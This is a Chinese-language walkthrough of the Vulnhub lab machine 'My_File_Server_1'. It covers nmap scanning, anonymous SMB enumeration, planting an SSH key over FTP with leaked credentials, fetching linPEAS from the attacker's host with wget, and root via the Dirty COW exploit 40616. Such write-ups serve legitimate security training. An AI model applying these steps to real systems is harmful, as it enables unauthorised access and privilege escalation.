## 靶机描述
级别:容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP: 192.168.1.148

sudo nmap --min-rate 10000 -sT -p- 192.168.1.148 -oA tcp_scan/ports
//Ports:
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
20048/tcp open  mountd

cat tcp_scan/ports.nmap | grep open | awk -F '/' '{print $1}' | tr '\n\r' ','
21,22,80,111,445,2049,2121,20048,

sudo nmap -sT -sC -sV -O -p 21,22,80,111,445,2049,2121,20048 192.168.1.148 -oA tcp_scan/details

```
> 21,2121的ftp服务权限很低，不能下载文件到本地

## Enum

```shell
sudo smbmap -H 192.168.1.148
// smbdata                                                 READ, WRITE     smbdata

sudo smbclient //192.168.1.148/smbdata //匿名登录

```
![[Pasted image 20231011134654.png]]
secure文件中得到一组凭据
![[Pasted image 20231011134718.png]]
```shell
showmount -e 192.168.1.148
//
Export list for 192.168.1.148:
/smbdata 192.168.56.0/24
56网段才可以访问
```


![[Pasted image 20231011135136.png]]
sshd_config显示SSH不允许密码登录

## Web
### 目录爆破

```shell
gobuster dir -u http://192.168.1.148 -w /usr/share/wordlists/dirb/common.txt -x txt
// /readme.txt           (Status: 200) [Size: 25]
//
My Password is
rootroot1

得到一个ftp凭据
smbuser:rootroot1
```

## 提权

```shell
使用smbuser:rootroot1登录ftp，目录是/home/smbuser
```

### FTP上传公钥获得立足点
![[Pasted image 20231011142159.png]]
```shell
本地生成ssh密钥对,上传公钥到ftp
sudo ssh-keygen //输入文件名，不需要输入密码
上传公钥(.pub),按照配置文件要求重命名为authorized_keys
sudo chmod 600 marshall(更改私钥权限为600)
//ftp
mkdir .ssh
cd .ssh
put /home/kali/Vulnhub/My_File_Server_1/marshall.pub authorized_keys

sudo ssh -i marshall smbuser@192.168.1.148 //得到立足点
//没有自动任务 没有suid权限文件
```

### 内核提取
```shell
uname -a 
// Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

// 这个内核版本可以使用dirty cow来提权(3.10.0-229.el7.x86_64)

//使用工具作为内核提权的参考(linPEAS)
git clone https://github.com/carlospolop/PEASS-ng.git(PEASS-ng/linPEAS/builder/linpeas_parts/**linpeas_base.sh**)

sudo php -S 0:80
//靶机
wget http://192.168.1.136/linpeas_base.sh
chmod +x linpeas_base.sh

# 或者从https://linpeas.sh/ 复制源码到本地(推荐)

//Dirty cow
searchsploit dirty cow

searchsploit -m 40616 
gcc 40616.c -o 40616 -pthread (waring可以忽略)
./40616 #成功提权
```
![[Pasted image 20231011152834.png]]
